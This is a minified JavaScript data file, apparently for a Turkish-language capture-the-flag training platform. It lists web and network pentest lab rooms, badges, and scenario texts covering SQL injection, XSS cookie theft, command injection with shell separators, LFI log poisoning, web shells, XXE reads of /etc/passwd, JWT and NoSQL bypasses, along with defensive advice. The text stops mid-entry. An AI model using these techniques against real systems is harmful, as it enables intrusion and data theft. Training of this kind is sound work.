(()=>{const o=[{slug:"web-exploitation",name:"Web Exploitation",icon:"\u{1F310}",color:"#00ff88",desc:"SQL Injection, XSS, CSRF ve daha fazlas\u0131 \u2014 web uygulamalar\u0131ndaki zafiyetleri ke\u015Ffet ve s\xF6m\xFCr.",rooms:[{id:"web-01",name:"SQL Injection: Giri\u015F & Bypass",difficulty:"Ba\u015Flang\u0131\xE7",desc:"Temel SQLi tekniklerini \xF6\u011Fren ve ilk bayra\u011F\u0131n\u0131 yakala.",users:1420,points:50},{id:"web-04",name:"Reflected XSS: Oturum \xC7alma",difficulty:"Ba\u015Flang\u0131\xE7",desc:"Reflected XSS ile cookie \xE7alma.",users:1290,points:50},{id:"web-11",name:"Kaba Kuvvet & Varsay\u0131lan Kimlik Bilgileri",difficulty:"Ba\u015Flang\u0131\xE7",desc:"Router y\xF6neticisinin varsay\u0131lan kimlik bilgileriyle giri\u015F yapma.",users:1150,points:50},{id:"web-12",name:"Command Injection: RCE Ke\u015Ffi",difficulty:"Ba\u015Flang\u0131\xE7",desc:"Ping panelinden komut enjeksiyonu ile bayrak okuma.",users:1080,points:50},{id:"web-13",name:"Kaynak Kod Analizi & Hassas Bilgi S\u0131z\u0131nt\u0131s\u0131",difficulty:"Ba\u015Flang\u0131\xE7",desc:"HTML yorum sat\u0131rlar\u0131nda gizlenen bayra\u011F\u0131 bulma.",users:980,points:50},{id:"web-14",name:"Directory Traversal: Dosya Okuma",difficulty:"Ba\u015Flang\u0131\xE7",desc:"../ ile yol traversal yaparak sunucu dosyalar\u0131n\u0131 okuma.",users:890,points:50},{id:"web-15",name:"Cookie Tampering: Yetki Y\xFCkseltme",difficulty:"Ba\u015Flang\u0131\xE7",desc:"\u0130stemci taraf\u0131 \xE7erezleri de\u011Fi\u015Ftirerek yetki y\xFCkseltme.",users:820,points:50},{id:"web-19",name:"IDOR & Rol De\u011Fi\u015Fimi ile Yetki Y\xFCkseltme",difficulty:"Ba\u015Flang\u0131\xE7",desc:"Profil veya kullan\u0131c\u0131 ayarlar\u0131 g\xFCncellenirken istek parametrelerindeki rol alanlar\u0131n\u0131 de\u011Fi\u015Ftirerek y\xF6netici yetkilerine y\xFCksel.",users:1020,points:50},{id:"web-02",name:"UNION-Based SQLi: Veri Taban\u0131 S\u0131zd\u0131rma",difficulty:"Orta",desc:"UNION SELECT ile \xE7oklu tablo dump etme.",users:950,points:75},{id:"web-05",name:"Stored & DOM XSS: Kal\u0131c\u0131 S\xF6m\xFCr\xFC",difficulty:"Orta",desc:"Kal\u0131c\u0131 XSS ve DOM manip\xFClasyonu.",users:870,points:75},{id:"web-06",name:"CSRF: Cross-Site Request Forgery",difficulty:"Orta",desc:"Cross-Site Request Forgery ile i\u015Flem tetikleme.",users:780,points:70},{id:"web-16",name:"LFI & Log Poisoning: Log Dosyalar\u0131 \xDCzerinden RCE",difficulty:"Orta",desc:"Yerel dosya dahil etme (LFI) a\xE7\u0131\u011F\u0131n\u0131 apache/nginx log poisoning y\xF6ntemiyle birle\u015Ftirerek sunucuda uzaktan kod \xE7al\u0131\u015Ft\u0131r (RCE).",users:720,points:80},{id:"web-17",name:"API BOLA: Yetkisiz Nesne Eri\u015Fimi",difficulty:"Orta",desc:"API endpoint'lerindeki kimlik ve nesne parametrelerini (ID) manip\xFCle ederek yetkisiz veri s\u0131z\u0131nt\u0131s\u0131 (BOLA) ger\xE7ekle\u015Ftir.",users:690,points:75},{id:"web-03",name:"Blind SQLi: Boolean & Time-Based",difficulty:"\u0130leri",desc:"Boolean ve time-based blind injection.",users:680,points:100},{id:"web-07",name:"File Upload Bypass: Web Shell",difficulty:"\u0130leri",desc:"Dosya y\xFCkleme filtrelerini atlatma ve shell alma.",users:620,points:100},{id:"web-08",name:"SSRF & XXE: \u0130\xE7 A\u011F S\u0131zmas\u0131",difficulty:"\u0130leri",desc:"Server-Side Request Forgery ve XML Entity injection.",users:580,points:120},{id:"web-18",name:"NoSQL Injection: MongoDB Bypass",difficulty:"\u0130leri",desc:"NoSQL mant\u0131ksal operat\xF6r enjeksiyonu ($ne, $gt) ile veritaban\u0131 filtrelerini ve login panelini bypass et.",users:480,points:100},{id:"web-09",name:"JWT Token S\xF6m\xFCr\xFCs\xFC & Algoritma Bypass",difficulty:"Uzman",desc:"JWT zafiyetleri: none algorithm, key confusion.",users:510,points:150}]},{slug:"network-pentest",name:"A\u011F S\u0131zma Testi",icon:"\u{1F517}",color:"#5cffba",desc:"A\u011F ke\u015Ffi, port tarama, servis s\xF6m\xFCr\xFCs\xFC ve pivotlama \u2014 kurumsal a\u011Flara s\u0131zma.",rooms:[{id:"net-01",name:"Nmap ile A\u011F Ke\u015Ffi",difficulty:"Ba\u015Flang\u0131\xE7",desc:"Port tarama, servis tespiti ve OS fingerprinting.",users:3100,points:50}]}],d=o.flatMap(a=>a.rooms.map(i=>({...i,cat:a.name,catSlug:a.slug,catIcon:a.icon}))),y=[{icon:"\u{1F947}",name:"G\xFCvenlik Uzman\u0131 Ba\u015Flang\u0131c\u0131",desc:"\u0130lk laboratuvar\u0131n\u0131 \xE7\xF6z"},{icon:"\u{1F525}",name:"7 G\xFCn Seri",desc:"7 g\xFCn \xFCst \xFCste giri\u015F yap"},{icon:"\u{1F310}",name:"Web Avc\u0131s\u0131",desc:"5 web g\xF6revini tamamla"},{icon:"\u26A1",name:"H\u0131zl\u0131 Parmaklar",desc:"Bir g\xF6revi tamamla"},{icon:"\u{1F513}",name:"\u0130lk Kan",desc:"Bir bayra\u011F\u0131 yakala"},{icon:"\u{1F4E1}",name:"A\u011F Takip\xE7isi",desc:"5 a\u011F g\xF6revi tamamla"},{icon:"\u2B50",name:"Uzman Seviyesi",desc:"Level 8'e ula\u015F"},{icon:"\u{1F3C6}",name:"\u0130lk 50'de",desc:"Liderlik tablosunda ilk 50"},{icon:"\u{1F3AF}",name:"CTF Mimar\u0131",desc:"5 CTF zincirini tamamla"},{icon:"\u{1F319}",name:"Gece Ku\u015Fu",desc:"Gece 02:00'de g\xF6rev \xE7\xF6z"},{icon:"\u{1F6E1}\uFE0F",name:"Savunmac\u0131",desc:"Blue team g\xF6revlerini bitir"},{icon:"\u{1F451}",name:"Efsane",desc:"100.000 puana ula\u015F"},{icon:"\u{1F480}",name:"Root Master",desc:"10 sisteme root ol"},{icon:"\u{1F3C5}",name:"30 G\xFCn Seri",desc:"30 g\xFCn \xFCst \xFCste giri\u015F yap"},{icon:"\u{1F48E}",name:"Tam Koleksiyon",desc:"T\xFCm rozetleri kazan"}],c={"web-01":{scenario:"Merhaba {name}. Hedef uygulaman\u0131n giri\u015F panelinde girdilerin parametrik olmayan sorgularla do\u011Frudan SQL motoruna g\xF6nderildi\u011Fini fark ettik. Bu giri\u015F formunu manip\xFCle etmeli ve admin paneline eri\u015Fim sa\u011Flamal\u0131s\u0131n.",goals:["SQL sorgular\u0131n\u0131n backend mant\u0131\u011F\u0131n\u0131 anlamak","Kimlik do\u011Frulama bypass tekniklerini kavramak","Giri\u015F formlar\u0131nda SQL enjeksiyon a\xE7\u0131klar\u0131n\u0131 test etmek"],realWorld:"Ger\xE7ek s\u0131zma testlerinde bu t\xFCr bypass a\xE7\u0131klar\u0131 sistemlerin saniyeler i\xE7inde ele ge\xE7irilmesine yol a\xE7ar. Geli\u015Ftiricilere Parametrik Sorgular (Prepared Statements) kullanmalar\u0131n\u0131 tavsiye etmelisin.",learned:["SQL enjeksiyon zafiyetini tespit etmeyi \xF6\u011Frendin.","Giri\u015F formlar\u0131nda SQL mant\u0131ksal sorgular\u0131n\u0131 (`OR 1=1`) kullanarak bypass yapabildin."]},"web-04":{scenario:"Merhaba {name}. Arama kutusuna yaz\u0131lan girdilerin hi\xE7bir filtrelemeden ge\xE7irilmeden sayfaya yans\u0131t\u0131ld\u0131\u011F\u0131n\u0131 (reflected) g\xF6rd\xFCk. Bir javascript kodu enjekte ederek kurban\u0131n taray\u0131c\u0131s\u0131nda \xE7al\u0131\u015Ft\u0131rmal\u0131 ve oturum anahtar\u0131n\u0131 (cookie) ele ge\xE7irmelisin.",goals:["Reflected XSS zafiyetinin \xE7al\u0131\u015Fma mant\u0131\u011F\u0131","JavaScript enjeksiyonu ile cookie \xE7alma","Girdi temizleme ve \xE7\u0131kt\u0131 kodlama prensipleri"],realWorld:"Reflected XSS, kimlik av\u0131 (phishing) sald\u0131r\u0131lar\u0131yla birle\u015Fti\u011Finde kurbanlar\u0131n oturumlar\u0131n\u0131 \xE7almak i\xE7in birebirdir. \xC7\xF6z\xFCm i\xE7in HttpOnly cookie bayra\u011F\u0131n\u0131 ve CSP (Content Security Policy) politikalar\u0131n\u0131 \xF6nermelisin.",learned:["Reflected XSS a\xE7\u0131\u011F\u0131 bar\u0131nd\u0131ran parametreleri ke\u015Ffetmeyi \xF6\u011Frendin.","Kurban\u0131n oturum bilgilerini \xE7almak i\xE7in JavaScript payload'lar\u0131 geli\u015Ftirdin."]},"web-02":{scenario:"Merhaba {name}. Web sayfas\u0131ndaki \xFCr\xFCn listeleme parametresinin SQL enjeksiyonuna a\xE7\u0131k oldu\u011Funu g\xF6rd\xFCk. SQL sorgular\u0131na `UNION SELECT` ekleyerek veritaban\u0131ndaki di\u011Fer tablolardan (\xF6rne\u011Fin kullan\u0131c\u0131lar ve \u015Fifreler) veri s\u0131zd\u0131rmal\u0131s\u0131n.",goals:["Sorgu s\xFCtun say\u0131s\u0131n\u0131 tespit etme (`ORDER BY`)","UNION SELECT ile veri birle\u015Ftirme","Veritaban\u0131 \u015Femas\u0131, tablo ve kolon isimlerini d\xF6kme"],realWorld:"UNION-based SQLi, bir sald\u0131rgan\u0131n veritaban\u0131ndaki t\xFCm hassas verileri (kullan\u0131c\u0131lar, \u015Fifreler, kredi kartlar\u0131) saniyeler i\xE7inde indirmesine (dump) olanak tan\u0131r. \xC7\xF6z\xFCm kesinlikle ORM kullanmak ya da parametrik sorgulara ge\xE7mektir.",learned:["S\xFCtun say\u0131s\u0131n\u0131 ve veri tiplerini e\u015Fle\u015Ftirmeyi \xF6\u011Frendin.","Veritaban\u0131ndaki gizli tablolar\u0131 d\xF6kerek admin \u015Fifrelerini s\u0131zd\u0131rd\u0131n."]},"web-05":{scenario:"Merhaba {name}. Yorum yapma alan\u0131nda g\xF6nderilen yorumlar\u0131n veritaban\u0131na kaydedildi\u011Fini ve sayfay\u0131 ziyaret eden herkese g\xF6sterildi\u011Fini tespit ettik. Kal\u0131c\u0131 (stored) bir XSS payload'u yazarak admin panelini ziyaret eden adminin oturumunu ele ge\xE7irmelisin.",goals:["Stored ve DOM tabanl\u0131 XSS aras\u0131ndaki farklar","Veritaban\u0131na javascript kodu enjekte etme","DOM manip\xFClasyonu ile client-side s\xF6m\xFCr\xFC"],realWorld:"Stored XSS, en tehlikeli XSS t\xFCr\xFCd\xFCr \xE7\xFCnk\xFC tek bir enjeksiyonla sayfaya giren y\xFCzlerce kullan\u0131c\u0131n\u0131n oturumu \xE7al\u0131nabilir veya taray\u0131c\u0131lar\u0131 exploit kitlere y\xF6nlendirilebilir.",learned:["Kal\u0131c\u0131 XSS zafiyetlerini veritaban\u0131 girdileri \xFCzerinden s\xF6m\xFCrmeyi \xF6\u011Frendin.","DOM nesnelerini manip\xFCle ederek istemci tarafl\u0131 siber sald\u0131r\u0131 ger\xE7ekle\u015Ftirdin."]},"web-06":{scenario:"Merhaba {name}. Kullan\u0131c\u0131 \u015Fifre de\u011Fi\u015Ftirme formunda CSRF koruma token'lar\u0131n\u0131n bulunmad\u0131\u011F\u0131n\u0131 veya do\u011Frulanmad\u0131\u011F\u0131n\u0131 fark ettik. Kurbana sahte bir istek tetikleterek onun haberi olmadan \u015Fifresini de\u011Fi\u015Ftirecek bir HTML payload'u haz\u0131rlamal\u0131s\u0131n.",goals:["CSRF (Cross-Site Request Forgery) mant\u0131\u011F\u0131","Otomatik tetiklenen sahte form haz\u0131rlama","SameSite \xE7erez politikalar\u0131"],realWorld:"CSRF, kullan\u0131c\u0131lar\u0131n taray\u0131c\u0131lar\u0131nda a\xE7\u0131k olan oturumlar\u0131 kullanarak onlar\u0131n ad\u0131na yetkisiz i\u015Flemler (para transferi, e-posta de\u011Fi\u015Ftirme vb.) yap\u0131lmas\u0131na neden olur. \xC7\xF6z\xFCm olarak benzersiz Anti-CSRF Token'lar\u0131 kullan\u0131lmal\u0131d\u0131r.",learned:["CSRF a\xE7\u0131\u011F\u0131 bar\u0131nd\u0131ran hassas i\u015Flem formlar\u0131n\u0131 tespit etmeyi \xF6\u011Frendin.","Oturum a\xE7\u0131kken arka planda istek tetikleyen sahte form senaryolar\u0131 tasarlad\u0131n."]},"web-03":{scenario:"Merhaba {name}. Hedef uygulaman\u0131n giri\u015Finde SQL hatalar\u0131 g\xF6sterilmiyor ve veri ekrana yans\u0131m\u0131yor. Ancak sorgunun do\u011Fru veya yanl\u0131\u015F olmas\u0131na g\xF6re sayfa farkl\u0131 yan\u0131tlar veriyor (veya gecikiyor). Boolean ve Time-based tekniklerle karakter karakter veri s\u0131zd\u0131rmal\u0131s\u0131n.",goals:["K\xF6r (Blind) SQL enjeksiyon kavram\u0131","SUBSTRING, ASCII ve SLEEP fonksiyonlar\u0131 kullan\u0131m\u0131","Ko\u015Fullu mant\u0131kla veritaban\u0131ndan harf harf veri s\u0131zd\u0131rma"],realWorld:"Blind SQLi, ekranda \xE7\u0131kt\u0131 veya hata vermeyen sessiz sistemlerde bile t\xFCm veritaban\u0131n\u0131 d\xF6kebilmeyi sa\u011Flar. Otomatize ara\xE7lar (sqlmap gibi) arka planda binlerce boolean/time sorgusu atarak \xE7al\u0131\u015F\u0131r.",learned:["Hata mesaj\u0131 vermeyen sistemlerde SQLi varl\u0131\u011F\u0131n\u0131 do\u011Frulamay\u0131 \xF6\u011Frendin.","Zaman gecikmesi (time-based) veya mant\u0131ksal farklar (boolean-based) ile veri s\u0131zd\u0131rma algoritmas\u0131n\u0131 kavrad\u0131n."]},"web-07":{scenario:"Merhaba {name}. Profil resmi y\xFCkleme alan\u0131nda dosya uzant\u0131s\u0131 kontrol\xFCn\xFCn yaln\u0131zca istemci taraf\u0131nda veya yetersiz yap\u0131ld\u0131\u011F\u0131n\u0131 belirledik. Filtreleri atlatarak (bypass) sisteme bir PHP Web Shell y\xFCklemeli ve sunucuda kod \xE7al\u0131\u015Ft\u0131rmal\u0131s\u0131n.",goals:["Client-side filtreleri atlatma","MIME-Type ve Double Extension (\xE7ift uzant\u0131) bypass","Web Shell kullanarak sunucuda uzaktan kod \xE7al\u0131\u015Ft\u0131rma (RCE)"],realWorld:"File Upload bypass zafiyetleri, sald\u0131rganlar\u0131n sunucunun tam kontrol\xFCn\xFC ele ge\xE7irmesine (RCE) yol a\xE7ar. Sunucu taraf\u0131nda dosya uzant\u0131s\u0131, i\xE7erik tipi do\u011Frulanmal\u0131 ve y\xFCklenen dosyalar \xE7al\u0131\u015Ft\u0131r\u0131lamayan bir dizine at\u0131lmal\u0131d\u0131r.",learned:["Farkl\u0131 dosya y\xFCkleme filtreleme y\xF6ntemlerini (uzant\u0131, MIME, magic numbers) a\u015Fmay\u0131 \xF6\u011Frendin.","Web shell y\xFCkleyerek sunucu i\u015Fletim sistemi d\xFCzeyinde komut \xE7al\u0131\u015Ft\u0131rma yetkisi kazand\u0131n."]},"web-08":{scenario:"Merhaba {name}. Web uygulamas\u0131 d\u0131\u015Far\u0131dan ald\u0131\u011F\u0131 URL veya XML verilerini sunucu taraf\u0131nda i\u015Fliyor. SSRF ile sunucuya i\xE7erideki gizli a\u011F servislerini taratmal\u0131, XXE ile XML parser'\u0131 manip\xFCle edip sunucu \xFCzerindeki `/etc/passwd` dosyas\u0131n\u0131 okumal\u0131s\u0131n.",goals:["Server-Side Request Forgery (SSRF) ile i\xE7 a\u011F ke\u015Ffi","XML External Entity (XXE) zafiyeti ile dosya okuma","D\u0131\u015F entity tan\u0131mlar\u0131 ile veri s\u0131zd\u0131rma"],realWorld:"SSRF ve XXE, bulut altyap\u0131lar\u0131nda (AWS, GCP metadata servisleri vb.) internal anahtarlar\u0131 ele ge\xE7irmek ve i\xE7 a\u011Fdaki korumal\u0131 sistemlere s\u0131zmak i\xE7in son derece kritik a\xE7\u0131klard\u0131r.",learned:["Sunucu \xFCzerinden i\xE7 a\u011Fa y\xF6nelik istekler g\xF6ndermeyi \xF6\u011Frendin.","G\xFCvensiz XML k\xFCt\xFCphanelerinin yerel dosyalar\u0131 s\u0131zd\u0131rmak i\xE7in nas\u0131l s\xF6m\xFCr\xFCld\xFC\u011F\xFCn\xFC anlad\u0131n."]},"web-09":{scenario:"Merhaba {name}. Uygulaman\u0131n kulland\u0131\u011F\u0131 JSON Web Token (JWT) mekanizmas\u0131nda imza do\u011Frulamas\u0131n\u0131n `none` algoritmas\u0131yla bypass edilebildi\u011Fini veya zay\u0131f bir anahtar kullan\u0131ld\u0131\u011F\u0131n\u0131 g\xF6rd\xFCk. Token'\u0131 manip\xFCle ederek admin rol\xFCn\xFC almal\u0131 ve i\xE7eri s\u0131zmal\u0131s\u0131n.",goals:["JWT yap\u0131s\u0131 (Header, Payload, Signature)","Algoritma kar\u0131\u015Ft\u0131rma ve `none` algoritmas\u0131 a\xE7\u0131\u011F\u0131","Token manip\xFClasyonu ve yetki y\xFCkseltme"],realWorld:"JWT zafiyetleri, API tabanl\u0131 modern uygulamalarda en \xE7ok kar\u015F\u0131la\u015F\u0131lan yetkilendirme hatalar\u0131ndand\u0131r. G\xFC\xE7l\xFC imza algoritmalar\u0131 (RS256) se\xE7ilmeli ve sunucu taraf\u0131nda imza asla bo\u015F ge\xE7ilmemelidir.",learned:["JWT yap\u0131s\u0131n\u0131 decode edip i\xE7indeki parametreleri manip\xFCle etmeyi \xF6\u011Frendin.","`none` algoritmas\u0131 kullanarak imza do\u011Frulamas\u0131n\u0131 tamamen devre d\u0131\u015F\u0131 b\u0131rakmay\u0131 ba\u015Fard\u0131n."]},"web-11":{scenario:"Merhaba {name}. \u015Eirketteki a\u011F router'\u0131n\u0131n y\xF6netim paneline eri\u015Fmemiz gerekiyor. Cihaz\u0131n varsay\u0131lan fabrika ayarlar\u0131 hi\xE7 de\u011Fi\u015Ftirilmemi\u015F. Varsay\u0131lan kimlik bilgilerini (admin/admin) kullanarak kontrol paneline giri\u015F yap ve router bayra\u011F\u0131n\u0131 oku.",goals:["Varsay\u0131lan kimlik bilgilerin risklerini anlamak","Ortak varsay\u0131lan parolalar\u0131 bilmek (admin/admin, root/root vb.)","A\u011F cihazlar\u0131n\u0131n y\xF6netim panellerine eri\u015Fim sa\u011Flamak"],realWorld:"G\xFCvenlik incelemelerde kurumsal a\u011F cihazlar\u0131n\u0131n (switch, router, firewall) hi\xE7 g\xFCncellenmemi\u015F ve varsay\u0131lan parolalar\u0131 kullan\u0131yor oldu\u011Fu s\u0131k\xE7a g\xF6r\xFCl\xFCr. Bu durumda t\xFCm a\u011F altyap\u0131s\u0131 ele ge\xE7irilebilir. Varsay\u0131lan parolalar\u0131 de\u011Fi\u015Ftirmek temel g\xFCvenlik uygulamalar\u0131ndan biridir.",learned:["Varsay\u0131lan kimlik bilgileriyle a\u011F cihazlar\u0131na eri\u015Fmeyi \xF6\u011Frendin.","Router y\xF6netim panelinde ayr\u0131cal\u0131kl\u0131 bilgilere ula\u015Ft\u0131n."]},"web-12":{scenario:"Merhaba {name}. \u015Eirketteki a\u011F y\xF6neticileri bir ping atma utility'si geli\u015Ftirmi\u015Fler. Kullan\u0131c\u0131 girdisini hi\xE7bir do\u011Frulama yap\u0131lmadan do\u011Frudan shell komutuna aktar\u0131yorlar. Komut ay\u0131r\u0131c\u0131 karakterler kullanarak ek komutlar enjekte et ve flag.txt dosyas\u0131n\u0131 oku.",goals:["Komut enjeksiyonu zafiyetinin \xE7al\u0131\u015Fma mekanizmas\u0131","Shell komut ay\u0131r\u0131c\u0131lar\u0131n\u0131 kullanma (;, |, &&, ||)","Arka planda istemci olmadan komut \xE7al\u0131\u015Ft\u0131rma"],realWorld:"Komut enjeksiyonu zafiyetleri, sald\u0131rgan\u0131n sunucu \xFCzerinde do\u011Frudan i\u015Fletim sistemi komutlar\u0131 \xE7al\u0131\u015Ft\u0131rmas\u0131na (RCE) olanak tan\u0131r. Bu t\xFCr a\xE7\u0131klar en tehlikeli olanlar\u0131ndand\u0131r. T\xFCm kullan\u0131c\u0131 girdileri d\xFCzenlenmelidir (whitelist/blacklist) veya sistem komutlar\u0131 hi\xE7 \xE7a\u011Fr\u0131lmamal\u0131d\u0131r.",learned:["Shell komut ay\u0131r\u0131c\u0131lar\u0131yla komut enjeksiyonu ger\xE7ekle\u015Ftirmeyi \xF6\u011Frendin.","Bir sistem komutunun yan etkisini kullanarak rastgele kod \xE7al\u0131\u015Ft\u0131rmay\u0131 ba\u015Fard\u0131n."]},"web-13":{scenario:"Merhaba {name}. Web sitesinin HTML kaynak kodlar\u0131nda geli\u015Ftiriciler taraf\u0131ndan gizlenen yorum sat\u0131rlar\u0131 var. Taray\u0131c\u0131n\u0131n geli\u015Ftirici ara\xE7lar\u0131n\u0131 (DevTools) a\xE7\u0131p sayfa kayna\u011F\u0131n\u0131 inceleyerek, HTML yorumlar\u0131n i\xE7inden bayrak k\u0131s\u0131t\u0131n\u0131 oku.",goals:["Taray\u0131c\u0131 geli\u015Ftirici ara\xE7lar\u0131n\u0131 kullanmak","HTML kaynak kodunu incelemek","Gizli yaz\u0131lar\u0131 ve a\xE7\u0131klamalar\u0131 yorumlarda bulma"],realWorld:"Geli\u015Ftiriciler test s\u0131ras\u0131nda kod i\xE7erisine ge\xE7ici notlar, API anahtarlar\u0131, veya test bayraklar\u0131yla birlikte yorum sat\u0131rlar\u0131 b\u0131rakabilirler. Proje yay\u0131na \xE7\u0131kmadan \xF6nce bu t\xFCr hassas bilgilerin dikkatli \u015Fekilde temizlenmesi \u015Fartt\u0131r. Kaynak kod analizi, s\u0131zma testlerinin ilk ad\u0131mlar\u0131ndan biridir.",learned:["Taray\u0131c\u0131 DevTools ile sayfa kayna\u011F\u0131n\u0131 analiz etmeyi \xF6\u011Frendin.","HTML yorum sat\u0131rlar\u0131nda gizlenen hassas bilgileri bulmay\u0131 ba\u015Fard\u0131n."]},"web-14":{scenario:"Merhaba {name}. Dosya indirme mod\xFCl\xFCnde bir dizin ge\xE7i\u015Fi (directory traversal) zafiyeti var. Kullan\u0131c\u0131dan al\u0131nan dosya ad\u0131 parametresi hi\xE7bir do\u011Frulama yap\u0131lmadan dosya sistemi yoluna kat\u0131l\u0131yor. \xDCst dizinlere t\u0131rmanarak sunucu k\xF6k dizininde bulunan flag.txt dosyas\u0131n\u0131 oku.",goals:["Dizin ge\xE7i\u015Fi (path traversal) mekanizmas\u0131","G\xF6reli yol (./) ve \xFCst dizin (..) notasyonunun kullan\u0131m\u0131","Dosya sistemi yap\u0131s\u0131n\u0131 ke\u015Ffetme"],realWorld:"Dizin ge\xE7i\u015Fi zafiyetleri, sald\u0131rgan\u0131n sunucu dosya sisteminderesim, yap\u0131land\u0131rma, veya \u015Fifre dosyalar\u0131 gibi hassas dosyalara eri\u015Fmesini sa\u011Flar. Belirtilen dizin d\u0131\u015F\u0131na \xE7\u0131k\u0131lmas\u0131n\u0131 engellemeyen g\xFCvensiz yap\u0131land\u0131rmalara \xF6rnek olarak index dosyalar\u0131 da verilebilebilir.",learned:["Dosya indirme parametreleri arac\u0131l\u0131\u011F\u0131yla dizin yap\u0131s\u0131n\u0131 traverse etmeyi \xF6\u011Frendin.","Sunucu k\xF6k dizinine eri\u015Ferek korumal\u0131 dosyalar\u0131 okumay\u0131 ba\u015Fard\u0131n."]},"web-15":{scenario:"Merhaba {name}. E-ticaret sitesinin giri\u015F sayfas\u0131, kullan\u0131c\u0131n\u0131n rol\xFCn\xFC (guest/admin) \u015Fifrelenmemi\u015F bir \xE7erezde saklamaktad\u0131r. Taray\u0131c\u0131 DevTools'u a\xE7\u0131p \xE7erez de\u011Ferini admin olarak de\u011Fi\u015Ftir ve y\xF6netim paneline eri\u015Fim sa\u011Fla.",goals:["\xC7erez y\xF6netimi ve istemci taraf\u0131 depolama mekanizmalar\u0131","\u015Eifrelenmemi\u015F \xE7erezlerin riskleri","Yetkilendirme bypass tekniklerini anlamak"],realWorld:"Yetkilendirme verileri hi\xE7bir \u015Fekilde istemci taraf\u0131nda saklanmamal\u0131d\u0131r. Sunucu taraf\u0131nda tutulan oturum bilgileri, \u015Fifreleme, ve dijital imza olmadan istemci verilerine hi\xE7 g\xFCvenilmemelidir. \xC7erez manip\xFClasyonu, \xE7o\u011Fu web sitesinde yetkisiz eri\u015Fimin en kolay yollar\u0131ndan biridir.",learned:["DevTools arac\u0131l\u0131\u011F\u0131yla \xE7erez bilgilerini incelemek ve d\xFCzenlemeyi \xF6\u011Frendin.","\xC7erez manip\xFClasyonuyla yetki y\xFCkseltme (privilege escalation) ba\u015Fard\u0131n."]},"net-01":{scenario:"Merhaba {name}. S\u0131zma testinin ilk ad\u0131m\u0131 ke\u015Fiftir. Nmap arac\u0131n\u0131 kullanarak hedef sistemin a\xE7\u0131k portlar\u0131n\u0131, \xE7al\u0131\u015Fan servislerini ve i\u015Fletim sistemini tespit etmelisin.",goals:["Port tarama ve servis s\xFCr\xFCm\xFC tespiti (`-sV`)","\u0130\u015Fletim sistemi tespiti (`-O`) ve h\u0131zl\u0131 tarama (`-F`)","Nmap Scripting Engine (NSE) kullan\u0131m\u0131"],realWorld:"Pentest projelerinde a\u011F ke\u015Ffi yap\u0131lmadan hi\xE7bir sald\u0131r\u0131 planlanamaz. A\xE7\u0131k servislerin ve versiyonlar\u0131n tespiti, do\u011Frudan bilinen exploit'leri aramaya y\xF6nlendirir.",learned:["A\xE7\u0131k portlar\u0131 ve servis versiyonlar\u0131n\u0131 do\u011Fru analiz etmeyi \xF6\u011Frendin.","\u0130\u015Fletim sistemi analizi ve agresif tarama y\xF6ntemlerini kavrad\u0131n."]},"web-16":{scenario:"Merhaba {name}. Hedef sunucu \xFCzerindeki bir parametrenin LFI (Local File Inclusion) zafiyetine sahip oldu\u011Funu tespit ettik. LFI tek ba\u015F\u0131na sadece dosya okumaya yarar; ancak sunucudaki apache/nginx access log dosyalar\u0131na web shell payload'u g\xF6nderip ard\u0131ndan bu log dosyas\u0131n\u0131 LFI ile dahil ederek RCE (Uzaktan Kod \xC7al\u0131\u015Ft\u0131rma) elde etmelisin.",goals:["LFI a\xE7\u0131\u011F\u0131n\u0131 tespit etme ve dizin ge\xE7i\u015Fi ile birle\u015Ftirme","Log Poisoning (Log Zehirleme) y\xF6ntemini anlama","User-Agent veya di\u011Fer HTTP ba\u015Fl\u0131klar\u0131 \xFCzerinden kod enjeksiyonu","Log dosyalar\u0131n\u0131 dahil ederek sistemde komut \xE7al\u0131\u015Ft\u0131rma"],realWorld:"Log zehirleme, bir dosya okuma/dahil etme a\xE7\u0131\u011F\u0131n\u0131 tam komut \xE7al\u0131\u015Ft\u0131rma yetkisine d\xF6n\xFC\u015Ft\xFCren son derece kritik bir post-exploitation tekni\u011Fidir. Savunma i\xE7in girdi kontrol\xFC ve log dosyas\u0131 eri\u015Fim izinlerinin s\u0131k\u0131la\u015Ft\u0131r\u0131lmas\u0131 \xF6nerilir.",learned:["LFI zafiyetini log zehirleme (log poisoning) ile birle\u015Ftirerek RCE elde etmeyi \xF6\u011Frendin.","HTTP istek ba\u015Fl\u0131klar\u0131n\u0131n sunucu loglar\u0131nda nas\u0131l i\u015Flendi\u011Fini ve s\xF6m\xFCr\xFCld\xFC\u011F\xFCn\xFC kavrad\u0131n."]},"web-17":{scenario:"Merhaba {name}. REST API tabanl\u0131 modern web uygulamalar\u0131nda BOLA (Broken Object Level Authorization) en s\u0131k kar\u015F\u0131la\u015F\u0131lan kritik a\xE7\u0131klardan biridir. `/api/v1/users/{id}/profile` endpoint'inde, di\u011Fer kullan\u0131c\u0131lara ait nesne ID'lerini (\xF6rne\u011Fin s\u0131ral\u0131 veya UUID format\u0131ndaki id parametrelerini) manip\xFCle ederek yetkisiz \u015Fekilde veri s\u0131zd\u0131rmal\u0131s\u0131n.",goals:["API istek yap\u0131s\u0131n\u0131 ve parametrelerini analiz etme","Nesne d\xFCzeyinde yetki do\u011Frulama eksikli\u011Fini tespit etme","ID parametrelerini de\u011Fi\u015Ftirerek (ID de\u011Fi\u015Ftirme sald\u0131r\u0131s\u0131) yetkisiz veri s\u0131zd\u0131rma"],realWorld:"BOLA zafiyetleri, sald\u0131rganlar\u0131n milyonlarca kullan\u0131c\u0131n\u0131n ki\u015Fisel verilerini, faturalar\u0131n\u0131 veya \xF6zel dosyalar\u0131n\u0131 sadece ID numaralar\u0131n\u0131 art\u0131rarak indirmelerine sebep olur. \xC7\xF6z\xFCm olarak sunucu taraf\u0131nda her istek i\xE7in nesne sahipli\u011Fi do\u011Frulamas\u0131 yap\u0131lmal\u0131d\u0131r.",learned:["BOLA / IDOR zafiyetlerini API endpoint'lerinde aramay\u0131 ve s\xF6m\xFCrmeyi \xF6\u011Frendin.","\u0130stemciye g\xFCvenen zay\u0131f yetkilendirme modellerinin risklerini kavrad\u0131n."]},"web-18":{scenario:"Merhaba {name}. Klasik ili\u015Fkisel veritabanlar\u0131n\u0131n aksine NoSQL veritabanlar\u0131 (MongoDB vb.) SQL kullanmaz; fakat zay\u0131f girdi temizli\u011Fi durumunda mant\u0131ksal sorgu operat\xF6rleri ($ne, $gt, $regex) enjekte edilebilir. Giri\u015F panelinde \u015Fifre alan\u0131na bir nesne enjekte ederek kimlik do\u011Frulamay\u0131 bypass etmelisin.",goals:["NoSQL sorgu yap\u0131s\u0131n\u0131 ve JSON girdi manip\xFClasyonunu anlama","MongoDB mant\u0131ksal 